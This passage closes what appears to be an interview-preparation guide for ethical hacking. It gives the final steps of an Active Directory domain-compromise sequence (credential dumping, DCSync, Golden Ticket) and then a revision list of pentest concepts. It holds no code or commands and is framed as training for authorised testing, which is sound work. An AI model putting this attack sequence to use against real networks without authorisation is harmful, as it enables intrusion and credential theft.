13. Find Domain Admin session
14. Steal token or dump creds
```

**Phase 5: Domain Compromise**
```
15. DCSync to extract all hashes
16. Create Golden Ticket
17. Access any system as any user
```

**Documentation:**
- Screenshot each step
- Document all findings
- Note detection opportunities

---

## 📋 Quick Revision - Top 20 Must-Know Concepts

1. **Pentest phases** - Recon, scan, exploit, post-exploit, report
2. **Black/White/Gray box** - Knowledge levels
3. **Nmap** - Port scanning fundamentals
4. **Burp Suite** - Web testing proxy
5. **SQL injection** - Database attacks
6. **XSS** - Script injection types
7. **Metasploit** - Exploitation framework
8. **Reverse shell** - Callback connection
9. **Privilege escalation** - User to root/admin
10. **Mimikatz** - Credential dumping
11. **Pass-the-hash** - NTLM hash reuse
12. **Kerberoasting** - Service account attacks
13. **Lateral movement** - Moving between systems
14. **Pivoting** - Access through compromised host
15. **BloodHound** - AD attack paths
16. **OWASP Top 10** - Web vulnerabilities
17. **CVSS** - Vulnerability scoring
18. **Scope** - What's allowed to test
19. **Report writing** - Deliver findings
20. **Responsible disclosure** - Ethical reporting

---

*End of 100 Interview Questions - Ethical Hacking*
